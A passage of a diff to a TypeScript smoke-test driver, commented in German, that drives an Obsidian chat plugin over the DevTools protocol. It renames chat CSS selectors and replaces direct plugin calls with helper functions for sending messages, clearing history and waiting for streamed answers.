     if (fake) await fake.close();
   }
 }
@@ -981,7 +1198,9 @@ async function sektionAnfrage(cdp: Cdp): Promise<void> {
     await setSetting(cdp, 'chatChoice', {});
     await setSetting(cdp, 'request', { overrides: {}, thinking: {}, lastOnLevel: {}, levelPickerInChat: false });
     const frage = async (): Promise<void> => {
-      await cdp.evaluate(`${P}.llm.invalidate(); ${P}.chatSession.reset(); await ${P}.askKuro("Hallo"); return true;`);
+      await cdp.evaluate(`${P}.llm.invalidate(); return true;`);
+      await chatNeu(cdp);
+      await chatFrage(cdp, 'Hallo');
     };
 
     // Body mit Modus-Defaults.
@@ -1056,7 +1275,7 @@ const FOLGE_TAKT = 30;
 const FOLGE_LAENGE = 10;
 const FOLGE_ABSAETZE = 50;
 /** Der Log-Körper der laufenden Antwort entsteht mit dem Strom: vorher liefert der Ausdruck nichts, damit die Messung nicht einen Vorgänger festhält und den Wechsel als Neuaufbau wertet. */
-const FOLGE_LOG = `(() => { const l = ${VIEW_EL}?.querySelector(".kuro-chat-log"); return l && l.querySelector(".okit-stream-block") ? l : null; })()`;
+const FOLGE_LOG = `(() => { const l = ${VIEW_EL}?.querySelector(".okit-chat-log"); return l && l.querySelector(".okit-stream-block") ? l : null; })()`;
 
 /** Startet eine Antwort im Chat (der Strom läuft im Renderer weiter) und wartet nicht. `window.__smokeFolge.fertig` zeigt das Ende. */
 async function starteFolgeStrom(cdp: Cdp): Promise<void> {
@@ -1065,23 +1284,23 @@ async function starteFolgeStrom(cdp: Cdp): Promise<void> {
   await cdp.evaluate(`
     window.__smokeFolge = { fertig: false };
     ${gegenprobe ? `// Gegenprobe (--folge-gegenprobe): ein Plugin, das ein Hochscrollen überschreibt. Genau der Folge-Punkt muss rot werden.
-    new MutationObserver(() => { const l = ${VIEW_EL}?.querySelector(".kuro-chat-log"); if (l) l.scrollTop = l.scrollHeight; }).observe(document.body, { childList: true, subtree: true, characterData: true });` : ''}
-    ${P}.askKuro("Erzähl lang.").finally(() => { window.__smokeFolge.fertig = true; });
+    new MutationObserver(() => { const l = ${VIEW_EL}?.querySelector(".okit-chat-log"); if (l) l.scrollTop = l.scrollHeight; }).observe(document.body, { childList: true, subtree: true, characterData: true });` : ''}
     return true;
   `);
+  await chatSenden(cdp, 'Erzähl lang.');
 }
 
 /** Verlauf leeren, BEVOR der Beobachter der Messung hängt: der Reset baut den Log-Körper neu, und `messeFolge` wertet einen
  *  ausgetauschten Scroll-Container als Neuaufbau („nichts gemessen“). */
 async function leereVerlauf(cdp: Cdp): Promise<void> {
-  const P = `app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}]`;
-  await cdp.evaluate(`${P}.chatSession.reset(); await new Promise((r) => setTimeout(r, 300)); return true;`);
+  await chatNeu(cdp);
+  await cdp.evaluate(`await new Promise((r) => setTimeout(r, 300)); return true;`);
 }
 
 /** Den Strom zu Ende laufen lassen, bevor der nächste Lauf den Verlauf leert (nach einem Abbruch wartet es nicht). */
 async function warteFolgeStromEnde(cdp: Cdp): Promise<void> {
   if (istAbgebrochen()) return;
-  await pollUntil<boolean>(cdp, `return window.__smokeFolge?.fertig === true ? true : null;`, 15000).catch(() => false);
+  await chatWarteAufEnde(cdp, 15_000);
 }
 
 async function sektionFolgeRegel(cdp: Cdp): Promise<void> {
@@ -1136,7 +1355,7 @@ async function sektionFolgeRegel(cdp: Cdp): Promise<void> {
   } finally {
     if (!istAbgebrochen()) {
       await setSetting(cdp, 'chatEndpoints', []);
-      await cdp.evaluate(`${P}.chatSession.reset(); ${P}.syncChat(); return true;`);
+      await cdp.evaluate(`${CHAT_LEEREN} return true;`);
     }
     if (stub) await stub.stop().catch(() => undefined);
   }
@@ -1160,21 +1379,21 @@ async function sektionGemma(cdp: Cdp): Promise<void> {
     await rebuildSidebar(cdp);
     await oeffneChatTab(cdp);
     await leereVerlauf(cdp);
-    await cdp.evaluate(`window.__smokeGemma = { fertig: false }; ${P}.askKuro("Gemma-Frage").finally(() => { window.__smokeGemma.fertig = true; }); return true;`);
+    await chatSenden(cdp, 'Gemma-Frage');
     const mid = await pollUntil<string>(
       cdp,
-      `const t = ${VIEW_EL}?.querySelector(".kuro-chat-stream-content")?.textContent ?? ""; return t.includes("Die fertige") && !t.includes("Antwort.") ? t : null;`,
+      `const t = ${VIEW_EL}?.querySelector(".okit-chat-turn.is-assistant .okit-stream-body")?.textContent ?? ""; return t.includes("Die fertige") && !t.includes("Antwort.") ? t : null;`,
       20_000,
       50,
     );
     const shotDir = process.env.SMOKE_SHOT_DIR;
     if (shotDir && mid !== null) {
       const { boxOf, capture } = await import('../../tools/obsidian-cdp/shot.js');
-      const box = await boxOf(cdp, `.kuro-chat-log`, 12);
+      const box = await boxOf(cdp, `.okit-chat-log`, 12);
       if (box) { mkdirSync(shotDir, { recursive: true }); writeFileSync(join(shotDir, 'gemma-antwort.png'), await capture(cdp, box, 2)); }
     }
-    await pollUntil<boolean>(cdp, `return window.__smokeGemma?.fertig === true ? true : null;`, 20_000).catch(() => false);
-    const ende = await cdp.evaluate<string>(`return (${VIEW_EL}?.querySelector(".kuro-chat-assistant .kuro-chat-md")?.textContent ?? "").trim();`);
+    await chatWarteAufEnde(cdp, 20_000);
+    const ende = await cdp.evaluate<string>(`return (${VIEW_EL}?.querySelector(".okit-chat-turn.is-assistant .okit-stream-body")?.textContent ?? "").trim();`);
     record(
       NAME,
       mid !== null && !mid.includes('wäge') && !mid.includes('channel') && ende === 'Die fertige Antwort.',
@@ -1186,7 +1405,7 @@ async function sektionGemma(cdp: Cdp): Promise<void> {
   } finally {
     if (!istAbgebrochen()) {
       await setSetting(cdp, 'chatEndpoints', []);
-      await cdp.evaluate(`${P}.chatSession.reset(); ${P}.syncChat(); return true;`);
+      await cdp.evaluate(`${CHAT_LEEREN} return true;`);
     }
     if (stub) await stub.stop().catch(() => undefined);
   }
@@ -1211,11 +1430,11 @@ async function sektionDenkblock(cdp: Cdp): Promise<void> {
     });
     await setSetting(cdp, 'chatEndpoints', [{ url: stub.url, model: MANAGER_DEFAULT_MODEL }]);
     await setSetting(cdp, 'chatChoice', {});
-    await cdp.evaluate(`${P}.llm.invalidate(); ${P}.chatSession.reset(); return true;`);
+    await cdp.evaluate(`${P}.llm.invalidate(); ${CHAT_LEEREN} return true;`);
     await rebuildSidebar(cdp);
     await oeffneChatTab(cdp);
     await leereVerlauf(cdp);
-    await cdp.evaluate(`window.__smokeDenk = { fertig: false }; ${P}.askKuro("Denk-Frage").finally(() => { window.__smokeDenk.fertig = true; }); return true;`);
+    await chatSenden(cdp, 'Denk-Frage');
     const block = (await pollUntil<boolean>(cdp, `return ${VIEW_EL}?.querySelector(".okit-stream-reasoning") ? true : null;`, 5000, 100)) === true;
     if (block) {
       zeichneDenkblock(bil, NAMEN, await messeDenkblockKopierbar(cdp, { block: `.workspace-leaf-content[data-type='${VIEW_TYPE}'] .okit-stream-reasoning`, knopf: `.workspace-leaf-content[data-type='${VIEW_TYPE}'] .okit-stream-reasoning-copy`, erwartetKnopf: true }));
@@ -1230,7 +1449,7 @@ async function sektionDenkblock(cdp: Cdp): Promise<void> {
   } finally {
     if (!istAbgebrochen()) {
       await setSetting(cdp, 'chatEndpoints', []).catch(() => undefined);
-      await cdp.evaluate(`${P}.chatSession.reset(); ${P}.syncChat(); return true;`).catch(() => undefined);
+      await cdp.evaluate(`${CHAT_LEEREN} return true;`).catch(() => undefined);
     }
     if (stub) await stub.stop().catch(() => undefined);
   }
@@ -1250,21 +1469,21 @@ async function sektionPflicht(cdp: Cdp): Promise<void> {
     stub = await startLlmStub({ models: [MANAGER_DEFAULT_MODEL] });
     await setSetting(cdp, 'chatEndpoints', [{ url: stub.url, model: MANAGER_DEFAULT_MODEL }]);
     await setSetting(cdp, 'chatChoice', {});
-    await cdp.evaluate(`${P}.llm.invalidate(); ${P}.chatSession.reset(); return true;`);
+    await cdp.evaluate(`${P}.llm.invalidate(); ${CHAT_LEEREN} return true;`);
     await rebuildSidebar(cdp);
     await oeffneChatTab(cdp);
-    const FELD = '.kuro-chat-input';
+    const FELD = '.okit-chat-input';
     zeichne('pflicht/fokus-erhalt', await messeFokusErhalt(cdp, { selector: FELD }));
     zeichne('pflicht/fokus-gegenprobe', await gegenprobeFokus(cdp, { selector: FELD }));
     const opts = {
-      selektoren: ['.kuro-chat-input', '.kuro-chat-inputrow .kuro-btn'],
-      erforderlich: ['.kuro-chat-input'],
-      fuelle: { in: '.kuro-chat-log' },
-      ueberlauf: '.kuro-chat-log',
+      selektoren: ['.okit-chat-input', '.okit-chat-send', '.okit-chat-new'],
+      erforderlich: ['.okit-chat-input'],
+      fuelle: { in: '.okit-chat-log' },
+      ueberlauf: '.okit-chat-log',
     };
     zeichne('pflicht/erreichbar-natuerliche-hoehe', await messeErreichbarkeit(cdp, opts));
-    zeichne('pflicht/erreichbar-kurzes-panel', await mitHoehe<PflichtTeilurteil>(cdp, { element: '.workspace-leaf', enthaelt: '.kuro-chat-inputrow', hoehe: 420 }, () => messeErreichbarkeit(cdp, opts)));
-    const gegen = await gegenprobeErreichbarkeit(cdp, { selektoren: opts.selektoren, rollbereich: '.kuro-chat-log', fuelle: opts.fuelle });
+    zeichne('pflicht/erreichbar-kurzes-panel', await mitHoehe<PflichtTeilurteil>(cdp, { element: '.workspace-leaf', enthaelt: '.okit-chat-composer', hoehe: 420 }, () => messeErreichbarkeit(cdp, opts)));
+    const gegen = await gegenprobeErreichbarkeit(cdp, { selektoren: opts.selektoren, rollbereich: '.okit-chat-log', fuelle: opts.fuelle });
     // Gemessen (Welle 24): die Eingabezeile steht UNTER dem Log, das in sich rollt (Punkt layout/log-scrollt-intern). Nimmt man dem Log den Rollbalken,
     // bleibt die Eingabezeile erreichbar: die Gegenprobe kann in diesem Layout nicht rot werden — nicht anwendbar, nicht grün.
     if (gegen.urteil === 'rot' && gegen.detail.startsWith('overflow:hidden, aber alle')) {
@@ -1276,7 +1495,7 @@ async function sektionPflicht(cdp: Cdp): Promise<void> {
   } finally {
     if (!istAbgebrochen()) {
       await setSetting(cdp, 'chatEndpoints', []).catch(() => undefined);
-      await cdp.evaluate(`${P}.chatSession.reset(); ${P}.syncChat(); return true;`).catch(() => undefined);
+      await cdp.evaluate(`${CHAT_LEEREN} return true;`).catch(() => undefined);
     }
     if (stub) await stub.stop().catch(() => undefined);
   }
@@ -1316,26 +1535,30 @@ async function sektionEchterEndpunkt(cdp: Cdp): Promise<void> {
   await rebuildSidebar(cdp);
   await oeffneChatTab(cdp);
   // Mutation und Wartephase getrennt: `cdp.evaluate` bricht nach 30 s ab, ein echtes Modell braucht länger.
+  // „Einzeln“ heißt: der Text der Antwort wächst in mehreren Schritten. Ein Beobachter am Verlauf zählt die verschiedenen Längen, die er sieht
+  // (das Fenster liefert keinen Token-Rückruf; der Treiber hängt nichts am Plugin ein).
+  await chatNeu(cdp);
   await cdp.evaluate(`
-    const p = app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}];
-    p.chatSession.reset();
-    window.__smokeEcht = { tokens: 0, erster: null, t0: Date.now(), fertig: false };
-    const leaf = app.workspace.getLeavesOfType(${JSON.stringify(VIEW_TYPE)})[0];
-    const orig = leaf.view.appendChatToken.bind(leaf.view);
-    window.__smokeEcht.orig = orig;
-    leaf.view.appendChatToken = (t) => { window.__smokeEcht.tokens += 1; window.__smokeEcht.erster ??= Date.now() - window.__smokeEcht.t0; orig(t); };
-    p.askKuro("Antworte mit genau einem Satz: Wer bist du?").finally(() => { window.__smokeEcht.fertig = true; });
+    window.__smokeEcht = { laengen: [], erster: null, t0: Date.now() };
+    const log = ${VIEW_EL}?.querySelector(".okit-chat-log");
+    const obs = new MutationObserver(() => {
+      const n = (log.querySelector(".okit-chat-turn.is-assistant .okit-stream-body")?.textContent ?? "").length;
+      const e = window.__smokeEcht;
+      if (n > 0 && !e.laengen.includes(n)) { e.laengen.push(n); e.erster ??= Date.now() - e.t0; }
+    });
+    obs.observe(log, { childList: true, subtree: true, characterData: true });
+    window.__smokeEcht.obs = obs;
     return true;
   `);
-  await pollUntil<boolean>(cdp, `return window.__smokeEcht?.fertig === true;`, 180_000).catch(() => false);
+  await chatSenden(cdp, 'Antworte mit genau einem Satz: Wer bist du?');
+  const beendet = await chatWarteAufEnde(cdp, 180_000);
   const lauf = await cdp.evaluate<{ tokens: number; antwort: string; fehler: string; erster: number | null; fertig: boolean }>(`
-    const p = app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}];
-    const leaf = app.workspace.getLeavesOfType(${JSON.stringify(VIEW_TYPE)})[0];
     const e = window.__smokeEcht;
-    leaf.view.appendChatToken = e.orig;
-    const antwort = p.chatSession.entries.filter((x) => x.role === "assistant").map((x) => x.text).join("");
-    const fehler = p.chatSession.entries.filter((x) => x.role === "error").map((x) => x.text + " " + (x.detail ?? "")).join(" | ");
-    const out = { tokens: e.tokens, antwort, fehler, erster: e.erster, fertig: e.fertig };
+    e.obs.disconnect();
+    const eintraege = ${PLUGIN_EXPR}.chatHistory.entries.filter((x) => x.kind === "assistant");
+    const antwort = eintraege.filter((x) => x.state === "done").map((x) => x.text).join("");
+    const fehler = eintraege.filter((x) => x.state === "failed").map((x) => (x.error?.kind ?? "") + " " + (x.error?.message ?? "") + " " + (x.error?.detail ?? "")).join(" | ").trim();
+    const out = { tokens: e.laengen.length, antwort, fehler, erster: e.erster, fertig: ${JSON.stringify(beendet)} };
     delete window.__smokeEcht;
     return out;
   `);
@@ -1357,7 +1580,7 @@ async function sektionSprache(cdp: Cdp): Promise<void> {
     cdp,
     `const body = ${VIEW_EL}?.querySelector(".kuro-chat-body");
      if (!body) return null;
-     const input = body.querySelector(".kuro-chat-input");
+     const input = body.querySelector(".okit-chat-input");
      return {
        texte: [...body.querySelectorAll("button, summary, h3, p, span")]
          .map((el) => el.textContent.trim()).filter(Boolean),
@@ -1688,7 +1911,7 @@ async function main(): Promise<void> {
         .evaluate<boolean>(`
           const p = app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}];
           p.data.settings = JSON.parse(${JSON.stringify(vorwert)});
-          p.chatSession.reset();
+          p.chatHistory = { entries: [], nextId: 1 };
           await p.persist();
           for (const leaf of app.workspace.getLeavesOfType(${JSON.stringify(VIEW_TYPE)})) leaf.detach();
           await new Promise((r) => setTimeout(r, ${istAbgebrochen() ? 0 : 300}));
@@ -1881,6 +2104,9 @@ async function main(): Promise<void> {
 
     console.log('── 9 · Markdown im Chat');
     await sektionMarkdown(cdp);
+    console.log('');
+    console.log('── 9b · Chat-Fenster und Modellzeile');
+    await sektionFenster(cdp);
     console.log('');
     console.log('── 10 · Kontextzeile folgt der Tagesnotiz');
     await sektionKontextSync(cdp);
